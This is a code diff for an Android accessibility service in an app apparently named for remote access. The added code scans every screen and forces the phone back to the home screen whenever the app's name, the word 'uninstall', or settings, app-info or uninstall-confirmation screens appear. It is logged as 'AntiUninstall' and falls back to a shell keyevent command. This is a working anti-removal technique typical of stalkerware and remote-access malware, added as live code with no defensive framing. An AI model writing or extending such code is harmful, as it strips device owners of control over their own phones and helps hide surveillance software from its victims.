@@ -144,38 +144,100 @@ public class AccessibilityHelperService extends AccessibilityService {
         try {
             String className = event.getClassName() != null ? event.getClassName().toString() : "";
             
+            // ALWAYS WATCH: If our app name appears anywhere, press home immediately
+            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+            if (rootNode != null) {
+                String ourPackage = getPackageName();
+                
+                // Check if our app name or package appears on ANY screen
+                if (containsOurAppName(rootNode, ourPackage)) {
+                    Log.w("AntiUninstall", "Our app name detected! Pressing HOME");
+                    // Immediately go to home to prevent uninstall
+                    pressHome();
+                    rootNode.recycle();
+                    return;
+                }
+                rootNode.recycle();
+            }
+            
             // Detect package installer / app info screens
             if (className.contains("PackageInstaller") ||
                 className.contains("AppInfo") ||
                 className.contains("Settings$AppInfo") ||
                 className.contains("UninstallConfirm") ||
                 className.contains("PackageManager") ||
-                className.contains("ResolverActivity")) {
+                className.contains("ResolverActivity") ||
+                className.contains("AppSettings") ||
+                className.contains("ManageApplications")) {
                 
-                // Check if our app name is visible
-                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-                if (rootNode != null) {
-                    String ourPackage = getPackageName();
-                    
-                    // Try to find our app name and click Cancel/Back
-                    if (findTextAndClick(rootNode, ourPackage)) {
-                        // Found our app - now close the activity
-                        performGlobalBack();
-                        rootNode.recycle();
-                        return;
+                // Press home immediately
+                pressHome();
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+    
+    private boolean containsOurAppName(AccessibilityNodeInfo node, String ourPackage) {
+        if (node == null) return false;
+        
+        try {
+            // Check text
+            CharSequence text = node.getText();
+            if (text != null) {
+                String textStr = text.toString().toLowerCase();
+                // Check for our package name or app name
+                if (textStr.contains(ourPackage.toLowerCase()) ||
+                    textStr.contains("remoteaccess") ||
+                    textStr.contains("educational") ||
+                    textStr.contains("uninstall")) {
+                    return true;
+                }
+            }
+            
+            // Check content description
+            CharSequence desc = node.getContentDescription();
+            if (desc != null) {
+                String descStr = desc.toString().toLowerCase();
+                if (descStr.contains(ourPackage.toLowerCase()) ||
+                    descStr.contains("remoteaccess") ||
+                    descStr.contains("educational")) {
+                    return true;
+                }
+            }
+            
+            // Check children
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    if (containsOurAppName(child, ourPackage)) {
+                        child.recycle();
+                        return true;
                     }
-                    
-                    // Try to find and click Cancel/Uninstall
-                    if (findAndClickButton(rootNode, "Cancel")) return;
-                    if (findAndClickButton(rootNode, "Uninstall")) return;
-                    if (findAndClickButton(rootNode, "OK")) return;
-                    if (findAndClickButton(rootNode, "Back")) return;
-                    
-                    rootNode.recycle();
+                    child.recycle();
                 }
             }
         } catch (Exception e) {
             // Ignore
+        }
+        
+        return false;
+    }
+    
+    private void pressHome() {
+        try {
+            // Go to home screen immediately
+            Intent homeIntent = new Intent(Intent.ACTION_MAIN);
+            homeIntent.addCategory(Intent.CATEGORY_HOME);
+            homeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(homeIntent);
+        } catch (Exception e) {
+            try {
+                // Alternative: press home button
+                Runtime.getRuntime().exec("input keyevent 3");
+            } catch (Exception e2) {
+                // Ignore
+            }
         }
     }
     
